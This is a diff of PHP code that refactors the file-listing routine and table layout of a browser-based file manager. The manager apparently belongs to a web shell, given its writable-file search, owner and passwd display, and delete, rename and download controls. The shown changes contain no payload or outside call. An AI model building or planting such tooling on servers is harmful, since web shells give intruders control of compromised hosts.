@@ -1601,7 +1601,7 @@ if (isset($p['me']) && $p['me'] === 'file'){
 		if (function_exists('posix_getpwuid')){
 			$array = @posix_getpwuid(@fileowner($filepath));
 			if ($array && is_array($array))
-				return ' / ' . mLink($array['name'], 'return false;', "title='User: {$array['name']} Passwd: {$array['passwd']} " .
+				return mLink($array['name'], 'return false;', "title='User: {$array['name']} Passwd: {$array['passwd']} " .
 					"UID: {$array['uid']}	GID: {$array['gid']} Gecos: {$array['gecos']} Dir: {$array['dir']} " .
 					"Shell: {$array['shell']}'", false);
 		}
@@ -1691,7 +1691,7 @@ if (isset($p['me']) && $p['me'] === 'file'){
 	}
 		
 	function fileList($typ, $dir, $limit, $page, $onlyW = false, $find = false, $rec = false, $count = 0){
-		global $dData;
+		global $fDataD, $fDataF;
 		$sFolder = $sFile = $show = true;
 		if ($limit){
 			$show = false;
@@ -1723,13 +1723,13 @@ if (isset($p['me']) && $p['me'] === 'file'){
 						fileList($typ, $dir . $file, $limit, $page, $find, $rec, $count);
 					else if ($show && $sFolder && checkFile($dir . $file, $onlyW, $find))
 						//yield array('t'=>'d', 'n'=>$file);
-						$dData['d'][] = $file;
+						$fDataD[] = $file;
 						
 					$count++;
 				} else if (is_file($dir . $file) && $sFile){
 					if ($show && checkFile($dir . $file, $onlyW, $find))
 						//yield array('t'=>'f', 'n'=>$file);
-						$dData['f'][] = $file;
+						$fDataF[] = $file;
 						
 					$count++;
 				} //TODO syslinks 
@@ -1737,9 +1737,7 @@ if (isset($p['me']) && $p['me'] === 'file'){
 			
 			closedir($res);
 			@clearstatcache();
-			return $dData;
-		} else
-			return array();
+		}
 	}
 
     if (@$p['md'] === 'vs'){
@@ -2096,11 +2094,11 @@ if (isset($p['me']) && $p['me'] === 'file'){
 				</tr></thead>
 				<tbody>';
 			
-			$dData = array();
+			$fDataD = $fDataF = array();
 			fileList($p['fm_mode'], $currentdir, $config['FMLimit'], $p['pg'], isset($p['fm_onlyW']), $p['fm_find'], isset($p['fm_rec']));
 			
-			@natcasesort($dData['d']);
-			foreach ($dData['d'] as $file){
+			@natcasesort($fDataD);
+			foreach ($fDataD as $file){
 					$d++;
 				$ft = filemtime($currentdir . $file);
 				$sBuff .= '<tr data-path="' . $file . DS . '" class="' . (($bg++ % 2 == 0) ? 'alt1' : 'alt2') . '">
@@ -2108,7 +2106,7 @@ if (isset($p['me']) && $p['me'] === 'file'){
 					<td><div class="image dir"></div><a href="#" onclick="godir(this, true);return false;">' . $file . '</a></td>
 						<td><a href="#" onclick="showUI(\'mdate\', this);return false;" data-ft="' . date('Y-m-d H:i:s', $ft) . '">' . date($config['datetime'], $ft) . '</a></td>
 						<td><a href="#" onclick="viewSize(this);return false;">[?]</a></td>
-					' . (!$isWIN ? '<td><a href="#" onclick="showUI(\'mpers\', this);return false;">' . vPermsColor($currentdir . $file) . '</a>&nbsp;' . getUser($currentdir . $file) . '</td>' : '') . '
+					' . (!$isWIN ? '<td><a href="#" onclick="showUI(\'mpers\', this);return false;">' . vPermsColor($currentdir . $file) . '</a><br>' . getUser($currentdir . $file) . '</td>' : '') . '
 						<td>
 						<div onclick="showUI(\'del\', this);return false;" class="image del"></div>
 						<div onclick="showUI(\'ren\', this);return false;" class="image rename"></div>
@@ -2117,10 +2115,10 @@ if (isset($p['me']) && $p['me'] === 'file'){
 						</td>
 						</tr>';
 			}
-			unset($dData['d']);
+			unset($fDataD);
 			
-			@natcasesort($dData['f']);
-			foreach ($dData['f'] as $file){
+			@natcasesort($fDataF);
+			foreach ($fDataF as $file){
 					$c++;
 				$ft = filemtime($currentdir . $file);
 				$sBuff .= '<tr data-path="' . $file . '" class="' . (($bg++ % 2 == 0) ? 'alt1' : 'alt2') . '">
@@ -2132,7 +2130,7 @@ if (isset($p['me']) && $p['me'] === 'file'){
 					   
 				$sBuff .= '</td><td><a href="#" onclick="showUI(\'mdate\', this);return false;" data-ft="' . date('Y-m-d H:i:s', $ft) . '">' . date($config['datetime'], $ft) . '</a></td>
 					<td>' . sizecount(filesize64($currentdir . $file)) . '</td>
-					' . (!$isWIN ? '<td><a href="#" onclick="showUI(\'mpers\', this);return false;">' . vPermsColor($currentdir . $file) . '</a>&nbsp;' . getUser($currentdir . $file) . '</td>' : '') . '
+					' . (!$isWIN ? '<td><a href="#" onclick="showUI(\'mpers\', this);return false;">' . vPermsColor($currentdir . $file) . '</a><br>' . getUser($currentdir . $file) . '</td>' : '') . '
 						<td>
 						<div onclick="showUI(\'del\', this);return false;" class="image del"></div>
 						<div onclick="showUI(\'ren\', this);return false;" class="image rename"></div>
@@ -2141,7 +2139,7 @@ if (isset($p['me']) && $p['me'] === 'file'){
 						<div onclick="dl(this);return false;" class="image download"></div>
 						</td></tr>';
 				}
-			unset($dData['f']);
+			unset($fDataF);
 			
 			$sBuff .= '</tbody><tfoot><tr class="' . (($bg++ % 2 == 0) ? 'alt1' : 'alt2') . '">
 				<td width="2%">' . mCheck('chkall', '', 'CheckAll(this.form);') . '</td>
